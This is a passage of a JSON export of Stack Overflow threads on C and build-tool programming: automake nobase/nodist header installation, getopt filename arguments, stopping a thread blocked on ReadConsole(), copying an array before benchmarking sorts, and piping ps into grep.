  hcrypto/bn.h      \\\n    hcrypto/cmac.h    \\\n    hcrypto/des.h     \\\n    hcrypto/dh.h      \\\n    hcrypto/dsa.h\nBUILT_SOURCES = hcrypto/aes.h \\\n    hcrypto/bn.h      \\\n    hcrypto/cmac.h    \\\n    hcrypto/des.h     \\\n    hcrypto/dh.h      \\\n    hcrypto/dsa.h\n</code></pre>\n"}], "owner": {"reputation": 6206, "user_id": 663279, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/75e80ff9348edc07c6e1fed85986323e?s=128&d=identicon&r=PG", "display_name": "David Mulder", "link": "https://stackoverflow.com/users/663279/david-mulder"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1113, "favorite_count": 0, "accepted_answer_id": 37110578, "answer_count": 1, "score": 11, "last_activity_date": 1462781199, "creation_date": 1461789656, "last_edit_date": 1462212942, "question_id": 36900450, "link": "https://stackoverflow.com/questions/36900450/how-to-use-autotools-nobase-and-nodist-prefixs-together-on-include-headers", "title": "How to use autotools nobase and nodist prefixs together on include_HEADERS", "body": "<p>I have some header files in a sub directory, that must be copied to a same-named sub directory in my include directory. I can use the nobase prefix to make that happen (I'm working with heimdal code, fyi):</p>\n\n<pre><code>nobase_include_HEADERS = hcrypto/aes.h \\\n      hcrypto/bn.h      \\\n      hcrypto/cmac.h    \\\n      hcrypto/des.h     \\\n      hcrypto/dh.h      \\\n      hcrypto/dsa.h     \\\netc...\n</code></pre>\n\n<p>But some of those header files are generated during the build process (since heimdal must be built before those header files exist), so I need to use the nodist prefix so that the dist doesn't die.</p>\n\n<p><a href=\"http://www.freesoftwaremagazine.com/articles/automatically_writing_makefiles_with_autotools\">I found an article</a> that said I could use them both together, and even provided a similar example, so I did this:</p>\n\n<pre><code>nobase_nodist_include_HEADERS = hcrypto/aes.h \\\n      hcrypto/bn.h      \\\n      hcrypto/cmac.h    \\\n      hcrypto/des.h     \\\n      hcrypto/dh.h      \\\n      hcrypto/dsa.h     \\\netc...\n</code></pre>\n\n<p>I didn't notice any warnings or errors, but those header files DO NOT get copied to my include directory.\nAm I doing something wrong, or is there a bug in autotools?</p>\n\n<p>Interesting, if I reverse the prefixes, I get this error:</p>\n\n<pre><code>Makefile.am:93: error: 'nodist_nobase_include_HEADERS' is used but 'nobase_includedir' is undefined\n</code></pre>\n\n<p>The reason for that error is explained here in the <a href=\"https://gnu.org/software/automake/manual/automake.html#Alternative\">automake documentation</a>:</p>\n\n<blockquote>\n  <p>\u2018nobase_\u2019 should be specified first when used in conjunction with either \u2018dist_\u2019 or \u2018nodist_\u2019</p>\n</blockquote>\n\n<p>I've also defined nodist_include_HEADERS (which is working). Maybe the two definitions are causing some kind of conflict?</p>\n\n<p>I just tried removing the nodist_include_HEADERS and putting all my headers under the nobase_nodist_include_HEADERS line, but now NONE of my headers get installed.</p>\n\n<p>Automake and system info:\nautomake (GNU automake) 1.13.4 openSUSE 13.2 (x86_64)</p>\n"}, {"tags": ["c", "getopt"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461790001, "post_id": 36900389, "comment_id": 61365271, "body": "Can you please post the particular question in a well formatted way that does not look like filename jive? What is the role of <code>brackets.exe</code>?"}, {"owner": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461790326, "post_id": 36900389, "comment_id": 61365458, "body": "I cleaned up I hope it helps.  The textfile provides information needed for some calculations. The reading, and the calculations both work perfectly. I didnt elaborate on the role of that file because I felt it would waste time, confuse and distract from the question."}], "answers": [{"comments": [{"owner": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "edited": false, "score": 0, "creation_date": 1461790432, "post_id": 36900640, "comment_id": 61365523, "body": "Okay.  But is there a case I could add to the program to get it to work the way I want it to without a -?"}, {"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "reply_to_user": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "edited": false, "score": 1, "creation_date": 1461790556, "post_id": 36900640, "comment_id": 61365598, "body": "Normally <code>getopt</code> is only used for switches, filenames are usually taken from the arguments which are left over and not parsed by <code>getopt</code>."}, {"owner": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "edited": false, "score": 0, "creation_date": 1461790997, "post_id": 36900640, "comment_id": 61365837, "body": "Oh thats interesting."}, {"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "reply_to_user": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "edited": false, "score": 1, "creation_date": 1461791104, "post_id": 36900640, "comment_id": 61365891, "body": "@Flowdorio <code>man getopt</code> will describe this in greater detail."}, {"owner": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "edited": false, "score": 0, "creation_date": 1461794553, "post_id": 36900640, "comment_id": 61367530, "body": "Do you have any example of how you would do this without inluding the filename as the optarg?"}], "tags": [], "owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "is_accepted": false, "score": 0, "last_activity_date": 1461827910, "last_edit_date": 1461827910, "creation_date": 1461790323, "answer_id": 36900640, "question_id": 36900389, "link": "https://stackoverflow.com/questions/36900389/getopt-adding-case-for-both-missing-option-and-missing-non-option-argument/36900640#36900640", "title": "Getopt - adding case for both missing option and missing non-option argument", "body": "<p>Programs using <code>getopt</code> should, by convention, read from stdin if you give it a <code>-</code> as an input parameter.</p>\n\n<p>As a side note, you should always have a case for <code>?</code> (or a <code>default</code> case).</p>\n\n<p>Here is an example of reading the remaining arguments, place it below the big <code>while</code> loop where you process all <code>getopt</code> flags:</p>\n\n<pre><code>int i;\nfor (i = optind; i &lt; argc; ++i)\n    printf(\"Non-option argument %s\\n\", argv[i]);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6544, "user_id": 451601, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/164602d512ce01f188e5a50593b46c5f?s=128&d=identicon&r=PG", "display_name": "James K. Lowden", "link": "https://stackoverflow.com/users/451601/james-k-lowden"}, "is_accepted": false, "score": 1, "last_activity_date": 1461814768, "creation_date": 1461814768, "answer_id": 36904821, "question_id": 36900389, "link": "https://stackoverflow.com/questions/36900389/getopt-adding-case-for-both-missing-option-and-missing-non-option-argument/36904821#36904821", "title": "Getopt - adding case for both missing option and missing non-option argument", "body": "<p>Forget the leading <code>:</code> in your <strong>getopt</strong> string; just use getopt for options.  After you're done with them, the remaining elements on the command line, if any, are found between <code>argv[optind]</code> and <code>argv[argc]</code>.  </p>\n\n<p>If the caller provides no filename, use <code>/dev/stdin</code> as the default, or <code>stdin</code> from <strong>stdlib.h</strong>.  No need to require the user to provide a <code>-</code> to stand in for standard input.  </p>\n"}, {"comments": [{"owner": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "edited": false, "score": 0, "creation_date": 1461852016, "post_id": 36907361, "comment_id": 61395915, "body": "I removed two questions I resolved myself. Thank you for this clean solution, I understand how it solves my problem and I have edited it to fit in my program(where filereading and calculations are done separately) :)"}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": true, "score": 2, "last_activity_date": 1461826470, "creation_date": 1461826470, "answer_id": 36907361, "question_id": 36900389, "link": "https://stackoverflow.com/questions/36900389/getopt-adding-case-for-both-missing-option-and-missing-non-option-argument/36907361#36907361", "title": "Getopt - adding case for both missing option and missing non-option argument", "body": "<p>Well, you can do exactly what you want to do with <code>getopt</code>, and more, you just need to adjust your logic slightly. Specifically, you can setup <code>getopt</code> so that:</p>\n\n<pre><code>fizzle.exe                        /* reads from stdin   */\nfizzle.exe -a                     /* reads from stdin   */\nfizzle.exe -a textfile.txt        /* reads textfile.txt */\nfizzle.exe textfile.txt           /* reads textfile.txt */\n</code></pre>\n\n<p>Here is a short example of implementing the above logic around the <code>-a</code> option. The last case also specifies that, if give, the first unhandled option after all options are given will also be taken as the filename to read.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt; /* for getopt */\n\nint main (int argc, char **argv) {\n\n    int opt;\n    char *fn = NULL;\n    FILE *pointerFile = stdin;  /* set 'stdin' by default */\n\n    while ((opt = getopt (argc, argv, \"a::b:\")) != -1) {\n        switch (opt) {\n            case 'a' :  /* open file if given following -a on command line */\n                if (!optarg) break;     /* if nothing after -a, keep stdin */\n                fn = argv[optind - 1];\n                pointerFile = fopen (fn, \"r\");\n                break;\n            case 'b' :; /* do whatever */\n                break;\n            default :   /* ? */\n                fprintf (stderr, \"\\nerror: invalid or missing option.\\n\");\n        }\n    }\n    /* handle any arguments that remain from optind -&gt; argc\n     * for example if 'fizzle.exe textfile.txt' given, read from\n     * textfile.txt instead of stdin.\n     */\n    if (pointerFile == stdin &amp;&amp; argc &gt; optind) {\n        fn = argv[optind++];\n        pointerFile = fopen (fn, \"r\");\n    }\n\n    printf (\"\\n fizzle.txt reads : %s\\n\\n\", pointerFile == stdin ? \"stdin\" : fn);\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Use/output</strong></p>\n\n<pre><code>$ ./bin/optfizzle\n\n fizzle.exe reads : stdin\n\n$ ./bin/optfizzle -a\n\n fizzle.exe reads : stdin\n\n$ ./bin/optfizzle -a somefile.txt\n\n fizzle.exe reads : somefile.txt\n\n$ ./bin/optfizzle someotherfile.txt\n\n fizzle.exe reads : someotherfile.txt\n</code></pre>\n\n<p>Look it over and let me know if you have any questions.</p>\n"}], "owner": {"reputation": 127, "user_id": 2644057, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/3ea743f9c106dfac4c1698b5aaf37521?s=128&d=identicon&r=PG&f=1", "display_name": "Flowdorio", "link": "https://stackoverflow.com/users/2644057/flowdorio"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 676, "favorite_count": 1, "accepted_answer_id": 36907361, "answer_count": 3, "score": 0, "last_activity_date": 1461841357, "creation_date": 1461789471, "last_edit_date": 1461841357, "question_id": 36900389, "link": "https://stackoverflow.com/questions/36900389/getopt-adding-case-for-both-missing-option-and-missing-non-option-argument", "title": "Getopt - adding case for both missing option and missing non-option argument", "body": "<p>I'm making a part of a bigger program, this part takes in information from a text file or a feed of standard input, the nature of this information depends on what option is added to the program. With no text file added as a non-option argument, the program should read from stdin.</p>\n\n<p>For example: </p>\n\n<p><strong>fizzle.exe -a textfile.txt</strong>    reads textfile.exe in the way prescriped by the option -a</p>\n\n<p><strong>fizzle.exe -a</strong> reads stdin in the way prescribed by the option a</p>\n\n<p>What I havent gotten to work yet is:</p>\n\n<p><strong>fizzle.exe textfile.txt</strong>    reading textfile.txt(or stdin if no proper text file) in the way prescribed by giving no option</p>\n\n<p>This is my code:</p>\n\n<pre><code>while ((option = getopt(argc,argv, \":a:b:\")) != -1 ) {\n\n    FILE *pointerFile = filereader(optarg);\n\n    switch(option) {\n        case 'a' :\n            optionchosen = 0;\n            counter(optionchosen,pointerFile,argv);\n            break;\n\n        case 'b' :\n            optionchosen = 1;\n            counter(optionchosen,pointerFile,argv);\n            break;\n\n\n        case ':' :\n            counter(optionchosen,pointerFile,argv);\n            break;          \n\n    }\n}\n</code></pre>\n\n<p>I cant figure out how to add a case to this switch that is activated by giving no option, but still works with or without the non-option argument(filename).</p>\n"}, {"tags": ["c", "windows", "multithreading"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461789771, "post_id": 36900035, "comment_id": 61365145, "body": "Find a way to get status before committing to a blocking function. I had a look but could not find a similar console function, apart from the perhaps simple minded suggestion to use <code>kbhit()</code>."}, {"owner": {"reputation": 234, "user_id": 5696554, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10203997152048831/picture?type=large", "display_name": "mychemicalro", "link": "https://stackoverflow.com/users/5696554/mychemicalro"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461792358, "post_id": 36900035, "comment_id": 61366507, "body": "i&#39;ve tried khbit, it returns immediatly. i have to get input from console in a buffer and send it over a socket"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461792454, "post_id": 36900035, "comment_id": 61366556, "body": "Of course it does - that&#39;s the point. <a href=\"https://msdn.microsoft.com/en-us/library/58w7c94c.aspx\" rel=\"nofollow noreferrer\"><code>kbhit</code></a> is non blocking, and tells you if a key is waiting in the input buffer, which you then read knowing it will not block. Meanwhile, you can check if the thread is supposed to close."}, {"owner": {"reputation": 2429, "user_id": 1098603, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/sb0id.png?s=128&g=1", "display_name": "Matthieu", "link": "https://stackoverflow.com/users/1098603/matthieu"}, "edited": false, "score": 0, "creation_date": 1461793314, "post_id": 36900035, "comment_id": 61366957, "body": "Doesn&#39;t <code>ReadConsole()</code> have a timeout option? Blocking forever is never a good thing to do in multithreaded applications."}, {"owner": {"reputation": 2429, "user_id": 1098603, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/sb0id.png?s=128&g=1", "display_name": "Matthieu", "link": "https://stackoverflow.com/users/1098603/matthieu"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461793949, "post_id": 36900035, "comment_id": 61367251, "body": "Agreed with @WeatherVane. Maybe you should try a regular <code>ReadFile()</code> with <code>stdin</code> opened in asynchronous mode..."}, {"owner": {"reputation": 2429, "user_id": 1098603, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/sb0id.png?s=128&g=1", "display_name": "Matthieu", "link": "https://stackoverflow.com/users/1098603/matthieu"}, "edited": false, "score": 0, "creation_date": 1461794234, "post_id": 36900035, "comment_id": 61367371, "body": "One last (ugly) thing you could try would be to <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683150(v=vs.85).aspx\" rel=\"nofollow noreferrer\"><code>FreeConsole()</code></a> your console, which would make the <code>ReadConsole()</code> fail, then <code>AttachConsole()</code> on your PID..."}, {"owner": {"reputation": 234, "user_id": 5696554, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10203997152048831/picture?type=large", "display_name": "mychemicalro", "link": "https://stackoverflow.com/users/5696554/mychemicalro"}, "edited": false, "score": 0, "creation_date": 1461794285, "post_id": 36900035, "comment_id": 61367403, "body": "Yes, thank you so much, now i&#39;ve managed to make it work with khbit. Another question: when i press enter in console, what should _getch return me?"}, {"owner": {"reputation": 234, "user_id": 5696554, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10203997152048831/picture?type=large", "display_name": "mychemicalro", "link": "https://stackoverflow.com/users/5696554/mychemicalro"}, "edited": false, "score": 0, "creation_date": 1461795090, "post_id": 36900035, "comment_id": 61367744, "body": "\\r, thank you again guys"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461795307, "post_id": 36900035, "comment_id": 61367838, "body": "@mychemicalro press the key, read the result, print it ;)"}, {"owner": {"reputation": 33265, "user_id": 886887, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/1616c7e4fab23f6e014ee11d75408bba?s=128&d=identicon&r=PG", "display_name": "Harry Johnston", "link": "https://stackoverflow.com/users/886887/harry-johnston"}, "edited": false, "score": 2, "creation_date": 1461797335, "post_id": 36900035, "comment_id": 61368650, "body": "CancelSynchronousIo might also be an option, though I&#39;m not sure whether it works on console I/O or not."}], "owner": {"reputation": 234, "user_id": 5696554, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10203997152048831/picture?type=large", "display_name": "mychemicalro", "link": "https://stackoverflow.com/users/5696554/mychemicalro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 218, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1461788197, "creation_date": 1461788197, "question_id": 36900035, "link": "https://stackoverflow.com/questions/36900035/c-how-to-terminate-a-thread-blocked-on-readconsole", "title": "C How to terminate a thread blocked on ReadConsole()?", "body": "<p>I'm trying to terminate a thread blocked on a ReadConsole() call from another thread. It doesn't work with terminateThread(i know it's not a good way to stop it) because when a restart that thread, somehow the thread is still there trying to return ReadConsole(). I've also tried to set an event from the other thread e wait for it on the other side, but i can't still figure out how to stop it.</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "edited": false, "score": 0, "creation_date": 1461788122, "post_id": 36899902, "comment_id": 61364194, "body": "How is the array created? Via <code>malloc()</code>? Does it just return a <code>static</code> variable?"}, {"owner": {"reputation": 355, "user_id": 4132440, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26941c99f40f7c42bfb3f211bf244860?s=128&d=identicon&r=PG&f=1", "display_name": "tester", "link": "https://stackoverflow.com/users/4132440/tester"}, "reply_to_user": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "edited": false, "score": 0, "creation_date": 1461788476, "post_id": 36899902, "comment_id": 61364406, "body": "Already got the answer i was looking for, but it was created with malloc and it returns an (array) variable of random size, with random ints"}], "answers": [{"comments": [{"owner": {"reputation": 355, "user_id": 4132440, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26941c99f40f7c42bfb3f211bf244860?s=128&d=identicon&r=PG&f=1", "display_name": "tester", "link": "https://stackoverflow.com/users/4132440/tester"}, "edited": false, "score": 1, "creation_date": 1461788202, "post_id": 36900015, "comment_id": 61364250, "body": "Well that was a quick answer, exactly what i was looking for. Thanks!"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 355, "user_id": 4132440, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26941c99f40f7c42bfb3f211bf244860?s=128&d=identicon&r=PG&f=1", "display_name": "tester", "link": "https://stackoverflow.com/users/4132440/tester"}, "edited": false, "score": 3, "creation_date": 1461788550, "post_id": 36900015, "comment_id": 61364449, "body": "@tester please &quot;accept&quot; the best answer you like. That&#39;s how SO works!"}], "tags": [], "owner": {"reputation": 102099, "user_id": 1600898, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/01377f8b31f24b0265854666b29d0c03?s=128&d=identicon&r=PG", "display_name": "user4815162342", "link": "https://stackoverflow.com/users/1600898/user4815162342"}, "is_accepted": true, "score": 5, "last_activity_date": 1461788099, "creation_date": 1461788099, "answer_id": 36900015, "question_id": 36899902, "link": "https://stackoverflow.com/questions/36899902/c-how-to-not-change-values-of-int-array-when-sorting/36900015#36900015", "title": "C - how to not change values of int array when sorting", "body": "<p>If the sorting methods sort the array in-place, you will need to send them a <strong>copy</strong> of the array. To avoid code duplication, the copying is best extracted into a utility function:</p>\n\n<pre><code>void benchmark(int *array, size_t array_len, void (*method)(int *)) {\n    int *array_copy = malloc(array_len * sizeof(int));\n    memcpy(array_copy, array, array_len * sizeof(int));\n\n    /* you can initialize a timer here */\n    method(array_copy);\n    /* you can output elapsed time here */\n\n    free(array_copy);\n}\n\n// ...\nint *array = makeArray();\nbenchmark(array, array_len, sortingMethod1);\nbenchmark(array, array_len, sortingMethod2);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 484, "user_id": 5950921, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/PfDEh.jpg?s=128&g=1", "display_name": "TheFooBarWay", "link": "https://stackoverflow.com/users/5950921/thefoobarway"}, "is_accepted": false, "score": 2, "last_activity_date": 1461788548, "creation_date": 1461788548, "answer_id": 36900131, "question_id": 36899902, "link": "https://stackoverflow.com/questions/36899902/c-how-to-not-change-values-of-int-array-when-sorting/36900131#36900131", "title": "C - how to not change values of int array when sorting", "body": "<p>You could copy the array as suggested.\nAn alternative is to create an additional array of pointers, each spot pointing to the data in the original array. When sorting you look at the data being pointed to but change the location of the pointer instead of the data itself.\nWould probably be more efficient in terms of memory.</p>\n\n<p>I am not aware of a way to sort an array without mutating it without using some sort of copy, be it the data or pointers to it. In C an array is very similar to a pointer to memory .  </p>\n"}], "owner": {"reputation": 355, "user_id": 4132440, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/26941c99f40f7c42bfb3f211bf244860?s=128&d=identicon&r=PG&f=1", "display_name": "tester", "link": "https://stackoverflow.com/users/4132440/tester"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 160, "favorite_count": 0, "accepted_answer_id": 36900015, "answer_count": 2, "score": 2, "last_activity_date": 1461788703, "creation_date": 1461787732, "last_edit_date": 1461788703, "question_id": 36899902, "link": "https://stackoverflow.com/questions/36899902/c-how-to-not-change-values-of-int-array-when-sorting", "title": "C - how to not change values of int array when sorting", "body": "<p>I'm new to C programming and wonder if there is a way to prevent changing the values of an array.</p>\n\n<p>I have an array:</p>\n\n<pre><code>int *array = makeArray();\n</code></pre>\n\n<p>Then I apply a sorting method to this array:</p>\n\n<pre><code>sortingMethod1(array);\n</code></pre>\n\n<p>When I call:</p>\n\n<pre><code>sortingMethod2(array);\n</code></pre>\n\n<p>The list is already sorted and I have no way of benchmarking the second sorting method.</p>\n\n<p>I'd like to know if there is a way of passing the same array to both functions without sorting it for the next function.</p>\n\n<p>If anyone could help me with what seems to be a very simple question I would appreciate it.</p>\n"}, {"tags": ["c", "linux", "grep", "exec"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461789588, "post_id": 36899748, "comment_id": 61365041, "body": "&quot;Should I just what I get from the pipe and pass it somehow to grep?&quot;. Yes you should. Connect the stdout of <code>ps</code> to the stdin of <code>grep</code>."}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461789644, "post_id": 36899748, "comment_id": 61365066, "body": "That is what i think i have done"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461789907, "post_id": 36899748, "comment_id": 61365222, "body": "You are using too many pipes. You only need one pipe. The parent does not need to be a conduit. The ps process should write to one end of the pipe and the grep should read from the other end."}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461790023, "post_id": 36899748, "comment_id": 61365279, "body": "I am using 2 pipes, one to get the ps output to grep, then one to get the grep output to the first parent process. Is this wrong?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461790133, "post_id": 36899748, "comment_id": 61365351, "body": "It&#39;s not wrong. But that wasn&#39;t what you stated in your question: &quot;I do not know how to put it into grep&quot;. To &quot;put it into grep&quot; you only need one pipe. So you are now saying you also want to pass the grep result back to the top process (not just print out the whole result to the terminal)? We can&#39;t really re-code the whole thing for you (which it may well need). Can only answer <i>specific</i> questions."}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1461793336, "post_id": 36899748, "comment_id": 61366973, "body": "The problem is not in the output of grep, it is in the input. What you suggested initially was already on the code and not working. I suggest we focus on the <i>specific</i> question which is, how do I get the output of ps into grep and not on the number of pipes I am using."}, {"owner": {"reputation": 164, "user_id": 6193510, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-dRTC5khvm-g/AAAAAAAAAAI/AAAAAAAAFK0/nKLXuPE-F5Y/photo.jpg?sz=128", "display_name": "Nevado", "link": "https://stackoverflow.com/users/6193510/nevado"}, "reply_to_user": 